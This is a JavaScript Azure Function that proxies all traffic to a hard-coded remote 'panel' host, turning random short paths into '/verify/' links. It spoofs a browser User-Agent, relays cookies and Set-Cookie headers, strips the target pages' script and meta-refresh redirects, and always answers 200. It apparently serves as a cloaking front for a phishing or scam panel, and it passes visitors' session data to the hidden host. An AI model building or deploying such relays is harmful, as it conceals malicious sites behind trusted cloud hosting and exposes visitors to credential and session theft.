const crypto = require('crypto');

const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    // Remove the proxy prefix if it exists
    path = path.replace(/^\/api\/proxy/, '');

    // 🚨 SMART ROUTING 🚨
    const parts = path.split('/').filter(Boolean);
    let originalRandomString = '';

    // If the URL is /RANDOM/CODE or /l/CODE or /verify/CODE
    if (parts.length === 2 && parts[1].length > 4) {
        originalRandomString = parts[0];
        path = `/verify/${parts[1]}`;
    } else if (parts.length === 1 && parts[0].length > 4) {
        path = `/verify/${parts[0]}`;
    }

    // 🛑 PROTECT AGAINST "METHOD NOT ALLOWED" 🛑
    // If we somehow get a POST request to /verify/, turn it into a GET
    const method = req.method === 'POST' && path.startsWith('/verify') ? 'GET' : req.method;

    if (!path.startsWith('/')) path = '/' + path;

    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }

    context.log(`Forwarding ${method} to:`, path);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        let currentUrl = `https://${PANEL}${path}`;
        let r;

        // Follow server-side HTTP redirects (302, 301, etc.)
        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: method,
                headers: forwardHeaders,
                body: body,
                redirect: 'manual'
            });

            const loc = r.headers.get('location');
            if (r.status >= 300 && r.status < 400 && loc) {
                let finalUrl = new URL(loc, currentUrl).toString();
                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                currentUrl = finalUrl;
                continue;
            }
            break;
        }

        let responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // 🚨 DESTROY CLIENT-SIDE JAVASCRIPT REDIRECTS 🚨
        if (contentType.includes('text/html')) {
            // Strip out any script tags that contain window.location
            responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                    return ''; // Remove the entire script tag
                }
                return match;
            });

            // Just in case it's inline or not in a script tag, strip the assignment
            responseBody = responseBody.replace(/window\.location(\.[a-zA-Z]+)?\s*=\s*['"][^'"]+['"];?/gi, '');
            responseBody = responseBody.replace(/window\.location\.(replace|assign)\(['"][^'"]+['"]\);?/gi, '');
            responseBody = responseBody.replace(/<meta[^>]*http-equiv=["']?refresh["']?[^>]*>/gi, '');
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };
        
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        // ALWAYS return 200 so the browser stops trying to find /verify/
        context.res = { status: 200, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
